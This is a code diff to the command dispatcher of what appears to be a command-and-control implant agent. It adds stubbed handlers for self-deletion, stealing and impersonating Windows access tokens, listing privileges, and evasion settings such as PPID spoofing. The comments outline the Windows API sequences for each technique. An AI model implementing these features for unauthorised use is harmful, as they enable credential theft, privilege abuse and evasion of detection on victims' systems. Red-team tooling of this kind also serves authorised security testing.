@@ -37,6 +37,14 @@ static void DispatchTask(Commander* self, ULONG commandCode, ULONG cmdId, BYTE* 
     case COMMAND_EXEC_BOF_ASYNC:     self->CmdExecBof(cmdId, data, dataSize); break;
     case COMMAND_JOB_LIST:           self->CmdJobList(cmdId, data, dataSize); break;
     case COMMAND_JOB_KILL:           self->CmdJobKill(cmdId, data, dataSize); break;
+    case COMMAND_SELFDEL:            self->CmdSelfdel(cmdId, data, dataSize); break;
+    case COMMAND_TOKEN_STEAL:        self->CmdTokenSteal(cmdId, data, dataSize); break;
+    case COMMAND_TOKEN_MAKE:         self->CmdTokenMake(cmdId, data, dataSize); break;
+    case COMMAND_TOKEN_IMPERSONATE:  self->CmdTokenImpersonate(cmdId, data, dataSize); break;
+    case COMMAND_TOKEN_LIST:         self->CmdTokenList(cmdId, data, dataSize); break;
+    case COMMAND_TOKEN_REMOVE:       self->CmdTokenRemove(cmdId, data, dataSize); break;
+    case COMMAND_TOKEN_PRIVS:        self->CmdTokenPrivs(cmdId, data, dataSize); break;
+    case COMMAND_CONFIG:             self->CmdConfig(cmdId, data, dataSize); break;
     default:                         break;
     }
 }
@@ -89,6 +97,8 @@ void Commander::CmdTerminate(ULONG cmdId, BYTE* data, ULONG dataSize)
 {
     (void)cmdId; (void)data; (void)dataSize;
     agent->active = FALSE;
+    // NOTE: Protocol overlays MUST build a response with the actual command code
+    // (COMMAND_EXIT / COMMAND_TERMINATE) so the server calls TsAgentTerminate.
 }
 
 // ── File system commands ───────────────────────────────────────────────────────
@@ -299,5 +309,87 @@ void Commander::CmdJobKill(ULONG cmdId, BYTE* data, ULONG dataSize)
     // Unpack: job_id (uint32)
     // Action: agent->jobs->Kill(jobId)
     // Response: RESP_COMPLETE
+    (void)cmdId; (void)data; (void)dataSize;
+}
+
+// ── Self-delete ────────────────────────────────────────────────────────────────
+
+void Commander::CmdSelfdel(ULONG cmdId, BYTE* data, ULONG dataSize)
+{
+    // Action: Windows — ADS rename + NtSetInformationFile(FileDispositionInformationEx)
+    //         Unix    — unlink(argv[0])
+    // Then set agent->active = false
+    // Response: RESP_COMPLETE
+    (void)cmdId; (void)data; (void)dataSize;
+    agent->active = FALSE;
+}
+
+// ── Token vault ────────────────────────────────────────────────────────────────
+
+void Commander::CmdTokenSteal(ULONG cmdId, BYTE* data, ULONG dataSize)
+{
+    // Unpack: pid (int64)
+    // Action: OpenProcess → OpenProcessToken → DuplicateTokenEx → ImpersonateLoggedOnUser
+    //         Store in agent->tokenVault
+    // Response: AnsTokenSteal{Id int, Domain string, Username string}
+    // TODO: Implement — Windows only
+    (void)cmdId; (void)data; (void)dataSize;
+}
+
+void Commander::CmdTokenMake(ULONG cmdId, BYTE* data, ULONG dataSize)
+{
+    // Unpack: domain (string), username (string), password (string)
+    // Action: LogonUserW(LOGON32_LOGON_NEW_CREDENTIALS) → ImpersonateLoggedOnUser
+    //         Store in agent->tokenVault
+    // Response: AnsTokenMake{Id int, Domain string, Username string}
+    // TODO: Implement — Windows only
+    (void)cmdId; (void)data; (void)dataSize;
+}
+
+void Commander::CmdTokenImpersonate(ULONG cmdId, BYTE* data, ULONG dataSize)
+{
+    // Unpack: id (int64)
+    // Action: Find token in vault by id → ImpersonateLoggedOnUser
+    // Response: AnsTokenImpersonate{Id int, Domain string, Username string}
+    // TODO: Implement — Windows only
+    (void)cmdId; (void)data; (void)dataSize;
+}
+
+void Commander::CmdTokenList(ULONG cmdId, BYTE* data, ULONG dataSize)
+{
+    // Unpack: (none)
+    // Action: Format agent->tokenVault entries
+    // Response: AnsTokenList{List string}
+    // TODO: Implement
+    (void)cmdId; (void)data; (void)dataSize;
+}
+
+void Commander::CmdTokenRemove(ULONG cmdId, BYTE* data, ULONG dataSize)
+{
+    // Unpack: id (int64)
+    // Action: CloseHandle(token.handle) + erase from vault
+    // Response: RESP_COMPLETE
+    // TODO: Implement
+    (void)cmdId; (void)data; (void)dataSize;
+}
+
+void Commander::CmdTokenPrivs(ULONG cmdId, BYTE* data, ULONG dataSize)
+{
+    // Unpack: (none)
+    // Action: OpenThreadToken/OpenProcessToken → GetTokenInformation(TokenPrivileges)
+    //         LookupPrivilegeNameW for each entry
+    // Response: AnsTokenPrivs{List string}
+    // TODO: Implement — Windows only
+    (void)cmdId; (void)data; (void)dataSize;
+}
+
+// ── Runtime config ─────────────────────────────────────────────────────────────
+
+void Commander::CmdConfig(ULONG cmdId, BYTE* data, ULONG dataSize)
+{
+    // Unpack: sub_cmd (int64), int_value (int64), str_value (string)
+    // Action: 1=ppidSpoof, 2=blockDlls, 3=spawnTo
+    // Response: AnsConfig{SubCmd int, IntValue int, StrValue string}
+    // TODO: Implement
     (void)cmdId; (void)data; (void)dataSize;
 }
